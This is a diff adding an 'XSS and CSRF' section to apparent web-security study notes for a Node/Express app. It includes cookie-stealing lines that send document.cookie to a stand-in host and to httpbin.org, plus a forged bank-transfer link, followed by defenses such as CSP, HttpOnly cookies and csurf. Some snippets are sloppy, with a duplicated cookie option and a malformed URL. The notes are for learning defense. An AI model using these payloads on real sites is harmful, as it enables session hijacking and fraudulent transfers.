@@ -1083,6 +1083,45 @@ winston.error('This guy is messing with us')
 
 **5. XSS and CSRF**
 
+XSS:
+```
+window.location = 'haxxed.com?cookie=' + document.cookie
+```
+
+CSRF
+```
+<a href="http://netbank.com/transfer.do?acct=AttackerA?amount;=$100">Read more!</a>
+
+// fetch() is default in console
+// open twitter.com and run in the console
+fetch('//httpbin.org/post', {method: 'POST', body: document.cookie})
+```
+
+Set content-security-policy:
+In server.js
+```
+app.get('/', (req, res) => {
+  res.cookie('session', '1', {httpOnly: true, httpOnly: true})
+  res.cookie('session', '1', {httpOnly: true, secure: true})
+  res.set({
+    'Content-Security-Policy': "script-src 'self' 'https://apis.google.com'"
+  })
+});
+```
+
+a. Sanitize input
+b. No eval()
+c. No document.write()
+d. Content Security Policy
+e. Secure + HTTPOnly Cookies
+
+In console:
+```
+document.write('<script>alert(1)</script>')
+```
+
+csurf: https://www.npmjs.com/package/csurf
 
 
-09: 12
+
+09: 13
